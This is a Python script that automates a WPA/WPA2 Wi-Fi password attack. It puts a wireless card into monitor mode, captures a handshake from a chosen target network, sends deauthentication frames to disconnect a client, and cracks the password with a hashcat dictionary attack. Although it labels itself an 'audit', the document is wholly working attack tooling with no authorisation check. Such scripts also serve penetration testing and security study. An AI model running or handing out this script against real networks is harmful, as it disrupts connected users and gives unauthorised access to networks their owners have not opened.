#!/usr/bin/env python3

import subprocess
import os
import time
import shutil
from datetime import datetime
import re
import sys

LOG_FILE = "log.txt"
CAP_FILE = "capture-01.cap"
HC22000_FILE = "capture.hc22000"

REQUIRED_TOOLS = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "hashcat"]

def log(msg):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    with open(LOG_FILE, "a") as f:
        f.write(f"{timestamp} {msg}\n")
    print(f"{timestamp} {msg}")

def run(cmd, check=True):
    log(f"Running: {cmd}")
    try:
        subprocess.run(cmd, shell=True, check=check)
    except subprocess.CalledProcessError:
        log(f"Error running command: {cmd}")
        if check:
            sys.exit(1)

def check_dependencies():
    missing = []
    for tool in REQUIRED_TOOLS:
        if shutil.which(tool) is None:
            missing.append(tool)
    if missing:
        log("Missing dependencies: " + ", ".join(missing))
        log("Install them using: sudo apt install aircrack-ng hashcat")
        sys.exit(1)
    log("All dependencies are installed")

def start_monitor_mode(interface):
    run("airmon-ng check kill")
    run(f"airmon-ng start {interface}")
    return f"{interface}mon"

def stop_monitor_mode(interface, mon_iface):
    log("Restoring network interface to managed mode")
    run(f"airmon-ng stop {mon_iface}")
    run("rfkill unblock wifi")
    run("service NetworkManager restart")
    run(f"ip link set {interface} up")
    log("Network interface restored")

def scan_networks(mon_iface):
    log("Scanning for networks. Stop with Ctrl+C once you've identified your target.")
    try:
        subprocess.run(f"airodump-ng {mon_iface}", shell=True)
    except KeyboardInterrupt:
        log("Scan stopped by user.")

def capture_handshake(mon_iface, bssid, channel):
    log("Starting handshake capture")
    run(f"airodump-ng -c {channel} --bssid {bssid} -w capture {mon_iface}")

def extract_client_mac():
    csv_file = "capture-01.csv"
    if not os.path.exists(csv_file):
        log("No CSV file found for client extraction.")
        return None

    with open(csv_file, "r") as f:
        lines = f.readlines()

    station_section = False
    for line in lines:
        if station_section and line.strip() and ',' in line:
            parts = [x.strip() for x in line.split(',')]
            if len(parts) > 1 and re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", parts[0]):
                return parts[0]
        if line.startswith("Station MAC"):
            station_section = True
    log("No client MAC found.")
    return None

def deauth(mon_iface, bssid, client_mac):
    log(f"Sending deauth to client {client_mac}")
    run(f"aireplay-ng --deauth 10 -a {bssid} -c {client_mac} {mon_iface}")

def check_handshake(cap_file, bssid):
    log("Checking for handshake")
    try:
        output = subprocess.check_output(f"aircrack-ng -a2 -b {bssid} {cap_file}", shell=True).decode()
        if "WPA (1 handshake)" in output or "WPA handshake" in output:
            log("Handshake detected")
            return True
        else:
            log("No handshake found")
            return False
    except subprocess.CalledProcessError:
        log("Error checking handshake")
        return False

def convert_to_hc22000(cap_file):
    log("Converting .cap to .hc22000 for hashcat")
    run(f"hcxpcapngtool -o {HC22000_FILE} {cap_file}")

def crack_with_hashcat(wordlist_path):
    if not os.path.exists(HC22000_FILE):
        log("No .hc22000 file found")
        return
    log("Starting brute-force with Hashcat (WPA/WPA2)")
    try:
        run(f"hashcat -m 22000 -a 0 -w 3 {HC22000_FILE} {wordlist_path} --force --quiet")
        result = subprocess.check_output(f"hashcat -m 22000 -a 0 -w 3 {HC22000_FILE} {wordlist_path} --show", shell=True).decode()
        if result:
            password = result.split(":")[-1].strip()
            log(f"Password successfully recovered: {password}")
        else:
            log("Password not found in wordlist")
    except subprocess.CalledProcessError as e:
        log("Hashcat failed")
        log(e.output.decode())

def main():
    check_dependencies()
    iface = input("Wireless interface (e.g., wlan0): ").strip()
    mon_iface = start_monitor_mode(iface)

    try:
        scan_networks(mon_iface)
        bssid = input("Target BSSID: ").strip()
        channel = input("Channel: ").strip()
        capture_handshake(mon_iface, bssid, channel)

        log("Waiting 10 seconds to ensure capture is saved...")
        time.sleep(10)

        client_mac = extract_client_mac()
        if client_mac:
            log(f"Found client MAC: {client_mac}")
            deauth(mon_iface, bssid, client_mac)
        else:
            log("Client MAC not found; skipping deauth")

        time.sleep(10)

        if not os.path.exists(CAP_FILE):
            log("Capture file not found")
            return

        if not check_handshake(CAP_FILE, bssid):
            log("Aborting: No handshake detected")
            return

        convert_to_hc22000(CAP_FILE)

        wordlist = input("Path to wordlist for hashcat: ").strip()
        crack_with_hashcat(wordlist)

    finally:
        stop_monitor_mode(iface, mon_iface)
        log("Audit complete")

if __name__ == "__main__":
    main()
